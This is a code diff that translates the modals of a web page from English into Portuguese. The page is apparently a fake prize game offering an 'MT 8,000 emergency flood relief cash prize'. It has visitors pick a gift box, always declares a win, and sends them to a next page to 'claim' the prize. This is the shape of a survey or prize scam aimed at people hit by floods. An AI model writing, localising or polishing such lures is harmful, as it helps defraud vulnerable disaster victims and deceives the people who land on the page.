@@ -292,23 +292,23 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">Parabéns! As suas respostas foram guardadas</h2>
  
 <p class="paragraph">
-Now you have a chance to win MT 8,000 EMERGENCY FLOOD RELIEF cash prize<br><br>
-You have 3 chances ! we wish you good luck
+Agora tem a oportunidade de ganhar o prémio em dinheiro de MT 8.000 de APOIO DE EMERGÊNCIA PARA ALÍVIO DAS CHEIAS<br><br>
+Tem 3 tentativas! Desejamos-lhe boa sorte
 <br><br>
-You need to select the box that has the gift inside the boxes.
+Precisa de selecionar a caixa que contém o prémio.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+Começar
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">Melhor sorte na próxima vez</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Tem (2) tentativas adicionais. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -317,17 +317,18 @@ OK
 </vue-modal>
 <vue-modal :open="showSuccessModal">
 <img src="https://www.cranecurrency.com/media/a0pcrzrl/arv01020-cropped.jpg" style="width: 240px;">
-<h1 class="heading heading--h1">Congratulations! </h1>
+<h1 class="heading heading--h1">Parabéns! </h1>
 <p class="paragraph">
 
 
-Your Prize is: <b> MT 8,000 cash</b><br>Follow the instructions on the next page to claim your prize ! 
+O seu prémio é: <b> MT 8.000 em dinheiro</b><br>Siga as instruções na próxima página para receber o seu prémio! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
 Ok
 </button>
 </vue-modal>
+
   
 <div class="left">
 <div class="product-preview">
